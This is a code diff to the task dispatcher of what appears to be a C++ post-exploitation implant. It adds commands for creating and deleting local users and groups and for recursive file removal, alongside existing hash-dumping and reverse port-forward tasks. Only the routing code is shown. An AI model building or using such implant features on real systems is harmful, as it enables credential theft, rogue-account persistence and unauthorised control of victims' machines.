@@ -231,8 +231,40 @@ namespace Handler
                     Utils::Convert::UTF8Decode(args["name"])
                 );
                 break;
+            case TASK_GROUP_ADD:
+                wTaskResult = Task::GroupAdd(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["name"])
+                );
+                break;
+            case TASK_GROUP_ADDUSER:
+                wTaskResult = Task::GroupAddUser(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["name"]),
+                    Utils::Convert::UTF8Decode(args["username"])
+                );
+                break;
             case TASK_GROUP_LS:
                 wTaskResult = Task::GroupLs(pState);
+                break;
+            case TASK_GROUP_RM:
+                wTaskResult = Task::GroupRm(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["name"])
+                );
+                break;
+            case TASK_GROUP_RMUSER:
+                wTaskResult = Task::GroupRmUser(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["name"]),
+                    Utils::Convert::UTF8Decode(args["username"])
+                );
+                break;
+            case TASK_GROUP_USERS:
+                wTaskResult = Task::GroupUsers(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["name"])
+                );
                 break;
             case TASK_HASHDUMP:
                 wTaskResult = Task::Hashdump(pState);
@@ -310,10 +342,11 @@ namespace Handler
                 );
                 break;
             case TASK_RM:
-                wTaskResult = Task::Rm(pState, Utils::Convert::UTF8Decode(args["path"]));
-                break;
-            case TASK_RMDIR:
-                wTaskResult = Task::Rmdir(pState, Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Rm(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["path"]),
+                    Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
+                );
                 break;
             case TASK_RPORTFWD_ADD:
                 wTaskResult = Task::RportfwdAdd(
@@ -384,8 +417,21 @@ namespace Handler
                     Utils::Convert::UTF8Decode(args["dest"])
                 );
                 break;
+            case TASK_USER_ADD:
+                wTaskResult = Task::UserAdd(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["username"]),
+                    Utils::Convert::UTF8Decode(args["password"])
+                );
+                break;
             case TASK_USER_LS:
-                wTaskResult = Task::Users(pState);
+                wTaskResult = Task::UserLs(pState);
+                break;
+            case TASK_USER_RM:
+                wTaskResult = Task::UserRm(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["username"])
+                );
                 break;
             case TASK_WHOAMI:
                 wTaskResult = Task::Whoami(pState);
